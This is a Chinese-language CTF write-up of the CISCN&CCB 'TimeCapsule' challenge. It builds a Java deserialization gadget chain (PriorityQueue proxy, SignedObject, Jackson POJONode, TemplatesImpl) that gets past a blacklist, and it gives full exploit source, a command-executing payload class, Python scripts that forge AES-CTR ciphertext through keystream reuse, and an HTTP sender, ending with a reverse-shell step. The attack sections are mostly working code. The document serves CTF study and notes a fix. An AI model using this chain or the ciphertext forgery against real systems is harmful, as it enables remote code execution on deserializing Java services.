# 2025 CISCN&CCB TimeCapsule详细解题过程-先知社区

> **来源**: https://xz.aliyun.com/news/17335  
> **文章ID**: 17335

---

# 1、环境搭建

用jadx-1.5.1把jar包打开

将源码全部保存

![](images/20250324163502-e17010ef-088a-1.png)

得到resource和source目录

source目录下为源码，需要删除除正常业务以外的依赖源码，仅保存com.ctf代码

![](images/20250324163503-e20080da-088a-1.png)

resource为资源，相关依赖包存放在resource/BOOT-INF/lib下

![](images/20250324163504-e251e396-088a-1.png)

如果8080端口被占用

![](images/20250324163505-e2b2c77b-088a-1.png)

可以这样修改，红框的内容可能有的idea没有，点修改选项，然后添加就行。

![](images/20250324163505-e32458b0-088a-1.png)

# 2、链子分析

![](images/20250324163506-e3a3aa89-088a-1.png)

发现在/capsules/import路由下面有反序列化操作

![](images/20250324163507-e4079d7b-088a-1.png)

然后有黑名单

![](images/20250324163507-e473f0d9-088a-1.png)

发现有一个，继承InvocationHandler代理和Serializable反序列化的工具类

也就是说，当我们触发readobject的时候是允许我们走到这个工具类的

![](images/20250324163508-e4d9ca11-088a-1.png)

这个方法实际上就是限定了你的前缀是get

那么经常打二次反序列化不难想到signobject链子是需要触发getobject的

## 链子后半段

因为有h2、jackson，而且还是jdk8版本

这里我是直接打signobject二次反序列化的jackson依赖

链子

```
signobject#getobject
    signobject#readobject
        BadAttributeValueExpException#readobject
            POJONode#toString
                BaseJsonNode#toString
                    InternalNodeMapper#nodeToString
                        ObjectWrite#writeValueAsString
                            Templateslmpl#恶意字节码
```

具体代码

```
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass0 = pool.get("com.fasterxml.jackson.databind.node.BaseJsonNode");
        CtMethod writeReplace = ctClass0.getDeclaredMethod("writeReplace");
        ctClass0.removeMethod(writeReplace);
        ctClass0.toClass();

        byte[] payloads = Files.readAllBytes(Paths.get("恶意字节码绝对路径TestTemplatesImpl.class"));
        Templates templatesImpl = new TemplatesImpl();
        setValue(templatesImpl, "_bytecodes", new byte[][]{payloads});
        setValue(templatesImpl, "_name", "aaaa");
        setValue(templatesImpl, "_tfactory", null);

        POJONode po1= new POJONode(makeTemplatesImplAopProxy(templatesImpl));
        BadAttributeValueExpException ba1= new BadAttributeValueExpException(1);
        setValue(ba1,"val",po1);


        KeyPairGenerator keyPairGenerator;
        keyPairGenerator = KeyPairGenerator.getInstance("DSA");
        keyPairGenerator.initialize(1024);
        KeyPair keyPair = keyPairGenerator.genKeyPair();
        PrivateKey privateKey = keyPair.getPrivate();
        Signature signingEngine = Signature.getInstance("DSA");
        SignedObject signedObject = new java.security.SignedObject(ba1, privateKey, signingEngine);
```

## 链子前半段

当时侯看到这个是想利用hashmap然后走到proxy.equals去触发invoke的，但是发现hashcode也有一个invoke方法，而且要比代理类那个提前触发，导致我们走不到getobject

为解决这个问题，我们可以想到CC2的PriorityQueue，让其中的comparator方法做代理，会在反序列化的时候被调用，然后就会执行invoke方法，成功执行恶意代码。

其实简单来讲，我们这里就是使用动态代理中的invok()方法代替了CC2中的

```
PriorityQueue.readObject()
PriorityQueue.heapify()
PriorityQueue.siftDown()
PriorityQueue.siftDownUsingComparator()
TransformingComparator.compare()
InvokerTransformer.transform()
Method.invoke()
```

前面半条链，因为项目中并没有引入commons-collections4的jar包，也就没有TransformingComparator和InvokerTransformer类。

所以前半条链可以是

```
PriorityQueue#readObject() ->
PriorityQueue#heapify() ->
PriorityQueue#siftDown()->
PriorityQueue#siftDownUsingComparator() ->
proxy.compare(TemplatesImpl) ->
fieldGetterHandler#invoke() ->
signobject#getobject->
```

## EXP部分

整合之后的exp是

```
/**
 * @className Exp
 * @Author shushu
 * @Data 2025/3/17
 **/
package com.ctf.util;
import com.fasterxml.jackson.databind.node.POJONode;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;
import javax.management.BadAttributeValueExpException;
import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.*;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.security.*;
import java.util.*;
import static org.shu.EXP.makeTemplatesImplAopProxy;
public class Exp {
    public static void main(String[] args) throws Exception {

        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass0 = pool.get("com.fasterxml.jackson.databind.node.BaseJsonNode");
        CtMethod writeReplace = ctClass0.getDeclaredMethod("writeReplace");
        ctClass0.removeMethod(writeReplace);
        ctClass0.toClass();

        byte[] payloads = Files.readAllBytes(Paths.get("C:\removeDisk\ideProject\JavaProject\learn\CCchainLearn\target\classes\ExpClass\TestTemplatesImpl.class"));
        Templates templatesImpl = new TemplatesImpl();
        setValue(templatesImpl, "_bytecodes", new byte[][]{payloads});
        setValue(templatesImpl, "_name", "aaaa");
        setValue(templatesImpl, "_tfactory", null);

        POJONode po1= new POJONode(makeTemplatesImplAopProxy(templatesImpl));
        BadAttributeValueExpException ba1= new BadAttributeValueExpException(1);
        setValue(ba1,"val",po1);


        KeyPairGenerator keyPairGenerator;
        keyPairGenerator = KeyPairGenerator.getInstance("DSA");
        keyPairGenerator.initialize(1024);
        KeyPair keyPair = keyPairGenerator.genKeyPair();
        PrivateKey privateKey = keyPair.getPrivate();
        Signature signingEngine = Signature.getInstance("DSA");
        SignedObject signedObject = new java.security.SignedObject(ba1, privateKey, signingEngine);

//上面的就是二次反序列化然后

//反射更改fieldName属性的值
        FieldGetterHandler fieldGetterHandler = new FieldGetterHandler();
        setValue(fieldGetterHandler, "fieldName","Object");
    

        Comparator invocationHandler = (Comparator) Proxy.newProxyInstance(Comparator.class.getClassLoader(), new Class[]{Comparator.class}, fieldGetterHandler);
        
        PriorityQueue priorityQueue = new PriorityQueue(2);
        priorityQueue.add(1);
        priorityQueue.add(2);
        Object[] queue = {signedObject,signedObject};
        setValue(priorityQueue,"comparator",invocationHandler);
        setValue(priorityQueue,"queue",queue);
        
        String bytes = serialize(priorityQueue);
        System.out.println(bytes);
        unserialize(bytes);

    }

    //提供需要序列化的类，返回base64后的字节码
    public static String serialize(Object obj) throws IOException {
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(obj);
        String poc = Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());
        return poc;
    }
    //提供base64后的字节码，进行反序列化
    public static void unserialize(String exp) throws IOException,ClassNotFoundException{
        byte[] bytes = Base64.getDecoder().decode(exp);
        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);
        ObjectInputStream objectInputStream = new SafeObjectInputStream(byteArrayInputStream);
        Object o = objectInputStream.readObject();
//        o.equals(new String());
    }
    public static void setValue(Object obj, String name, Object value) throws Exception{
        Field field = obj.getClass().getDeclaredField(name);
        field.setAccessible(true);
        field.set(obj, value);
    }
}

```

TestTemplatesImpl.class

```
/**
 * @className TestTemplatesImpl
 * @Author shushu
 * @Data 2025/2/12
 **/
package ExpClass;


import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

public class TestTemplatesImpl extends AbstractTranslet {

    public TestTemplatesImpl() {
        super();
        try {
            Runtime.getRuntime().exec("calc");
        }catch (Exception e){
            e.printStackTrace();
        }
    }

    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
```

这里是为了验证链子能否绕过，直接新建了一个路由，然后把base64的恶意字节进行反序列化。

![](images/20250324163509-e53e88ee-088a-1.png)

成功召唤计算器

![](images/20250324163510-e5fa0f51-088a-1.png)

## fix

那么其实到这里我们直接把代理类的invoke方法置空就行，就可以过check了

# 3、题目后半部分——break

当你以为题目就这么简单结束的时候，错了。

因为他还有一部分是密码的。

看看密码的工具类：

```
public static String encrypt(byte[] data, SecretKey key) throws Exception {
        Cipher cipher = Cipher.getInstance("AES/CTR/NoPadding");
        byte[] iv = new byte[16];
        SecureRandom.getInstanceStrong().nextBytes(iv);
        IvParameterSpec ivSpec = new IvParameterSpec(iv);
        cipher.init(1, key, ivSpec);
        byte[] encrypted = cipher.doFinal(data);
        byte[] combined = new byte[iv.length + encrypted.length];
        System.arraycopy(iv, 0, combined, 0, iv.length);
        System.arraycopy(encrypted, 0, combined, iv.length, encrypted.length);
        return Base64.getEncoder().encodeToString(combined);
    }

    public static byte[] decrypt(String base64Data, SecretKey key) throws Exception {
        byte[] combined = Base64.getDecoder().decode(base64Data);
        byte[] iv = new byte[16];
        byte[] encrypted = new byte[combined.length - 16];
        System.arraycopy(combined, 0, iv, 0, iv.length);
        System.arraycopy(combined, iv.length, encrypted, 0, encrypted.length);
        Cipher cipher = Cipher.getInstance("AES/CTR/NoPadding");
        cipher.init(2, key, new IvParameterSpec(iv));
        return cipher.doFinal(encrypted);
    }
```

这里的

```
 Cipher cipher = Cipher.getInstance("AES/CTR/NoPadding");
```

意思是使用 **AES 算法**、**CTR 模式** 和 **不使用填充**。

那么什么是CTR模式呢？

它是一种通过将逐次累加的计数器进行加密来生成密钥流的流密码。最终的密文分组是通过将计数器加密的到的比特序列，与明文分组进行XOR而得到的。

## CTR加密

![](images/20250324163511-e6c59ec0-088a-1.png)

## CTR解密

![](images/20250324163512-e751d030-088a-1.png)

## encrypt方法

传入进去的是byte[]数组和key，

然后核心加密的内容是这段代码

```
byte[] combined = new byte[iv.length + encrypted.length];
System.arraycopy(iv, 0, combined, 0, iv.length);
System.arraycopy(encrypted, 0, combined, iv.length, encrypted.length);
```

意思是创建一个新数组 combined，其长度是 IV 和加密数据的总长度。  
使用 System.arraycopy 方法将 IV 和加密后的数据复制到 combined 数组中：  
将 IV 复制到 combined 的前面。将加密后的数据复制到 combined 的后面。

![](images/20250324163513-e7b5310f-088a-1.png)

大概就是这么个事

## decrypt方法

decrypt方法传入进去的是base64数据和key

使用了密文的前16字节做为iv ，然后对密文进行下一步的解密。

## 目前的情况

目前的路由就是

```
/capsules
传入的是恶意的字节流，base64编码的内容

/capsules/{id}/export路由会加密一个反序列化数据然后把那个加密后的数据返回
这个数据称作原密文
而这个加密之前称做原明文，并不是我们的base64编码的内容

/capsules/import
得到的base64就往这里面去传完成序列化。
```

这里的原明文怎么拿到呢？很简单其实

新建一个路由，然后把

CryptoUtils.encrypt(bos.toByteArray(), key);

替换成

Base64.getEncoder().encodeToString(bos.toByteArray());

即可

```
 @GetMapping({"/capsules/{id}/plaintext"})
    public String exportCapsulereal(@PathVariable Long id, Authentication authentication) throws Exception {
        User user = (User)this.userRepository.findByUsername(authentication.getName()).orElseThrow(() -> {
            return new RuntimeException("User not found");
        });
        TimeCapsule capsule = (TimeCapsule)this.capsuleRepository.findById(id).orElseThrow(() -> {
            return new RuntimeException("Capsule not found");
        });
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(bos);
        oos.writeObject(capsule);
        oos.close();
//        SecretKey key = new SecretKeySpec(Base64.getDecoder().decode(user.getSecretKey()), "AES");
        return Base64.getEncoder().encodeToString(bos.toByteArray());
    }
```

那么就是原明文、原密文是已知的、iv是可控的，那这个就很容易去联想到AES-CBC字节翻转攻击

![](images/20250324163514-e828d67e-088a-1.png)

我利用GPT搓了一个脚本出来

![](images/20250324163515-e8a4c965-088a-1.png)

```
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from base64 import b64decode

def xor_bytes(b1, b2):
    return bytes(a ^ b for a, b in zip(b1, b2))

# 示例数据
iv = b'\x00' * 16  # 假设 IV 为 16 个零字节
key = b'\x00' * 32  # 假设密钥为 32 个零字节（256 位）
ciphertext = b64decode('QbkOqUl868RfOoe9CrKV6MuorM0nQAA0RTQXEAfgANeA==')  # 示例密文（Base64 编码）
plaintext = b'Your plaintext data here.'  # 示例明文

# 创建 AES-CTR 模式的 Cipher 对象
cipher = Cipher(algorithms.AES(key), modes.CTR(iv), backend=default_backend())
encryptor = cipher.encryptor()

# 生成密钥流并验证
generated_keystream = b''
for i in range(0, len(ciphertext), 16):
    block_ciphertext = ciphertext[i:i+16]
    block_plaintext = plaintext[i:i+16]
    block_keystream = xor_bytes(block_plaintext, block_ciphertext)
    generated_keystream += block_keystream

# 输出生成的密钥流
print('Generated Keystream:', generated_keystream)

```

这个脚本有了一个大概样子，但是需要修改一下

```
1、key用不到，因为我们是根据异或去生成密钥流的
2、iv为密文的前16个字节，加密数据为密文16个字节往后的数据
3、AES-CTR 模式的 Cipher 对象也用不上删掉
4、generated_keystream应该是为一个数组，然后每16个字节存放一个位置
```

大概就是

```
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from base64 import b64decode

def xor_bytes(b1, b2):
    return bytes(a ^ b for a, b in zip(b1, b2))

# 示例数据

ciphertext = b'Your ciphertext data here.'  # 示例原密文
plaintext = b'Your plaintext data here.'  # 示例原明文
iv = ciphertext[:16]
ciphertext=ciphertext[16:]
# 生成密钥流并验证
generated_keystream = []
for i in range(0, len(ciphertext), 16):
    block_ciphertext = ciphertext[i:i+16]
    block_plaintext = plaintext[i:i+16]
    block_keystream = xor_bytes(block_plaintext, block_ciphertext)
    generated_keystream.append(block_keystream)

# 输出生成的密钥流
print('Generated Keystream:', generated_keystream)
```

我们密钥流已经有了

那么我们应该怎么去构造我们的任意密文呢？

其实我们的想法就是把恶意的base64数据通过密钥流来加工成密文

所以我们拿密钥流的每16个字节跟明文的每16个字节异或一次即可

具体就是

```
tarPlaintext=b''#传入/capsules路由的base64恶意字节流
tarPlaintext=b64decode(tarPlaintext)
#
newCiphertext=b''
for i in range(0,len(ciphertext),16):
    newCiphertext+=xor_bytes(generated_keystream[i//16],tarPlaintext[i:i+16])
# 最后加上偏移量就成为我们的密文了
newCiphertext=iv+newCiphertext
```

但是经过我测试发现还是没办法生成我们想要的密文，因为没办法确定tarPlaintext、ciphertext、plaintext一定就为16的倍数

那么我们用一个min函数来取剩下的数据即可

最后的脚本就是

```
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from base64 import b64decode
import base64
def xor_bytes(b1, b2):
    return bytes(a ^ b for a, b in zip(b1, b2))

# 示例数据

ciphertext = b'Your ciphertext data here.'  # 示例原密文
plaintext = b'Your plaintext data here.'  # 示例原明文

ciphertext = b64decode(ciphertext)  # （Base64 编码）
plaintext = b64decode(plaintext)  # （Base64 编码）
iv = ciphertext[:16]

ciphertext=ciphertext[16:]
generated_keystream = []
for i in range(0, len(ciphertext), 16):
    block_ciphertext = ciphertext[i:min(i+16,len(ciphertext))]
    block_plaintext = plaintext[i:min(i+16,len(plaintext))]
    block_keystream = xor_bytes(block_ciphertext,block_plaintext)
    generated_keystream.append(block_keystream)

# 输出生成的密钥流
print('Generated Keystream:', generated_keystream)
tarPlaintext=b''
tarPlaintext=b64decode(tarPlaintext)
#
newCiphertext=b''#传入/capsules路由的base64恶意字节流
for i in range(0,len(ciphertext),16):
    newCiphertext+=xor_bytes(generated_keystream[i//16],tarPlaintext[i:min(i+16,len(tarPlaintext))])
# 最后加上偏移量就成为我们的密文了
newCiphertext=iv+newCiphertext
# 输出生成的密文
print('Generated Ciphertext:', base64.b64encode(newCiphertext))
```

这里测试发现得用python发包才能执行命令，

发包exp

```
import requests
session = requests.Session()

url="http://192.168.0.101:55555/api/capsules/import"
cook={"JSESSIONID":"9FEE8F6B5330CE70418691604D397C40"}
headers={
    "Authorization":"Basic YWRtaW4xMjM6YWRtaW4xMjM=",
    "Content-Type": "application/json",
    "Cookie":"JSESSIONID=9FEE8F6B5330CE70418691604D397C40",
}
data=b'修改后的任意密文'
res=session.post(url, headers=headers, data=data,cookies=cook)
print(res.text)
```

成功召唤出计算器

![](images/20250324163516-e97c26f3-088a-1.png)

# 4、复现整到题目

## 1、注册

```
POST /api/register HTTP/1.1
Host: 127.0.0.1:55555
sec-ch-ua: "Chromium";v="125", "Not.A/Brand";v="24"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.112 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: keep-alive
Content-Type: application/json
Content-Length: 45

{"username":"admin123","password":"admin123"}
```

## 2、加载恶意字节码

```
POST /api/capsules HTTP/1.1
Host: 127.0.0.1:45412
Cache-Control: max-age=0
Authorization: Basic YWRtaW4xMjM6YWRtaW4xMjM=
sec-ch-ua: "Chromium";v="125", "Not.A/Brand";v="24"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.112 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=7E45B5491F7F134DE561EFCFBF1FB280
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 17184

base64恶意字节码的URL编码
```

![](images/20250324163517-ea582464-088a-1.png)

## 3、导出原明文

这个导出原名文是在本地中拿到的

```
POST /api/capsules HTTP/1.1
Host: 127.0.0.1:55555
Cache-Control: max-age=0
Authorization: Basic YWRtaW4xMjM6YWRtaW4xMjM=
sec-ch-ua: "Chromium";v="125", "Not.A/Brand";v="24"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.112 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=9FEE8F6B5330CE70418691604D397C40
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 16848

base64恶意字节码的URL编码
```

![](images/20250324163519-eb086cb7-088a-1.png)

然后访问

![](images/20250324163520-ebb24f0e-088a-1.png)

## 4、导出原密文

![](images/20250324163521-ec5c8ab9-088a-1.png)

## 5、生成新密文

运行python脚本即可

## 6、反弹shell命令执行

![](images/20250324163522-ece91a1c-088a-1.png)
